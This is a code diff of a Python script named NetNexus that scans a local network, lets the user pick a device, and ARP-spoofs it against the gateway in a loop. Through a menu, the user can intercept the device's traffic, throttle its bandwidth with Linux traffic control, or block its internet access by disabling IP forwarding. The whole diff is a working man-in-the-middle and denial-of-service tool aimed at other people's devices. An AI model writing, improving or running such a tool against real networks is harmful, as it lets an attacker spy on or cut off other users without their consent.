@@ -6,42 +6,39 @@ import subprocess
 from core import scanner, spoof
 
 def set_forwarding(state):
-    """Enable or disable IP forwarding (1 to allow internet, 0 to kill it)."""
     val = "1" if state else "0"
     subprocess.run(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True)
 
 def set_limit(interface, speed):
-    """Uses Linux Traffic Control to limit the target's bandwidth."""
-    # First, clear any existing limits
+    # Clear old rules first to avoid "File exists" errors
     subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
-    
-    # Apply new limit using Token Bucket Filter (tbf)
-    # speed should be a string like '50kbps'
     try:
+        # Token Bucket Filter (tbf) for stable limiting
         subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                         "rate", speed, "latency", "50ms", "burst", "1540"], check=True)
         print(f"[*] Bandwidth limited to {speed}")
-    except subprocess.CalledProcessError:
-        print(f"[-] Error: Could not set speed to {speed}. Check your format (e.g., 50kbps).")
+    except Exception as e:
+        print(f"[-] Limit Error: {e}")
 
 def clear_limit(interface):
     subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
 
 def main():
-    iface = "wlan0" # Replace with your interface from 'ip a'
+    # Detect interface or use wlan0
+    iface = "wlan0" 
     scapy.conf.iface = iface
     
     if os.geteuid() != 0:
-        print("[-] NetNexus requires root privileges.")
+        print("[-] Please run with sudo.")
         return
 
     gateway_ip = "192.168.8.1"
     ip_range = "192.168.8.1/24"
-    device_memory = {}
+    device_memory = {} 
 
     while True:
         print("\n" + "="*45)
-        print("      NetNexus: Custom Control Mode")
+        print("      NetNexus: Final Stable Build")
         print("="*45)
         
         device_memory = scanner.scan(ip_range, device_memory)
@@ -59,45 +56,34 @@ def main():
         
         try:
             target = current_list[int(user_input)]
-            
-            print(f"\nAction for {target['ip']} ({target['name']}):")
-            print("[1] Intercept (Normal)")
-            print("[2] Limit (Custom Speed)")
-            print("[3] Kill (Block Internet)")
-            mode = input("Choose Action: ")
+            target_ip, target_mac = target['ip'], target['mac']
 
-            print(f"[*] Resolving Gateway MAC...")
+            print(f"\n[1] Intercept | [2] Limit | [3] Kill")
+            mode = input("Select Action: ")
+
             gateway_mac, _ = spoof.get_device_info(gateway_ip)
 
             if mode == "1":
                 set_forwarding(True)
                 clear_limit(iface)
             elif mode == "2":
-                kbps = input("Enter limit in kbps (e.g., 20): ")
-                speed_str = f"{kbps}kbps"
+                kbps = input("Speed (kbps): ")
                 set_forwarding(True)
-                set_limit(iface, speed_str)
+                set_limit(iface, f"{kbps}kbps")
             elif mode == "3":
                 set_forwarding(False)
                 clear_limit(iface)
 
-            print(f"[*] Attack Active on {target['ip']}...")
-            packet_count = 0
+            print(f"[*] Locked on {target_ip}. Intercepting...")
             while True:
-                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
-                packet_count += 2
-                print(f"\r[+] Packets Sent: {packet_count} | Mode: {mode} | Target: {target['ip']}", end="")
-                time.sleep(0.5)
+                spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
+                time.sleep(0.5) # Balance between speed and CPU usage
                 
         except (ValueError, IndexError):
-            print("[-] Invalid Selection.")
+            print("[-] Selection Error.")
         except KeyboardInterrupt:
-            print("\n[*] Stopping... Cleaning up system settings.")
+            print("\n[*] Cleaning up...")
             set_forwarding(True)
             clear_limit(iface)
-            spoof.restore(target['ip'], gateway_ip)
-            spoof.restore(gateway_ip, target['ip'])
-            time.sleep(1)
-
-if __name__ == "__main__":
-    main()
+            spoof.restore(target_ip, gateway_ip)
+            spoof.restore(gateway_ip, target_ip)
